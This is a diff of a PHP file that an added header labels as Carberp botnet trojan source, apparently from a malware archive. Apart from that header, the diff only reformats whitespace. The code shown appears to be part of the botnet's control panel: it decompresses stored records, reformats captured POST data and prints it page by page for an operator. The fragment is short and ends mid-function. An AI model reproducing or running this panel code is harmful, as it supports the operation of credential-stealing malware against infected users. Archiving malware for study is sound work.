@@ -1,11 +1,24 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 //header('Content-type: text/plain');
 
-function test($d){	print_r($d);
+function test($d){
+	print_r($d);
 }
 
-function data($d){	$d = gzinflate($d);
+function data($d){
+	$d = gzinflate($d);
 	//$d = convert_to($d);
 	$d = str_replace('[,]', '', $d);
 	$d = str_replace('?|POST:', "\r\n\r\nPOST:\r\n\r\n", $d);
@@ -16,14 +29,17 @@ function data($d){	$d = gzinflate($d);
 
 $cp = 0;
 
-function get($r){	global $cp;
+function get($r){
+	global $cp;
 	print(data($r->data). "<hr>");
 	$cp++;
 }
 
 if(!empty($Cur['id']) && !empty($Cur['str'])){
-	if(!empty($Cur['page'])){		$lp = $Cur['page'] * 100;
-	}else{		$lp = '0';
+	if(!empty($Cur['page'])){
+		$lp = $Cur['page'] * 100;
+	}else{
+		$lp = '0';
 	}
 
 	$name_p = mb_substr($Cur['str'], 0, 2);
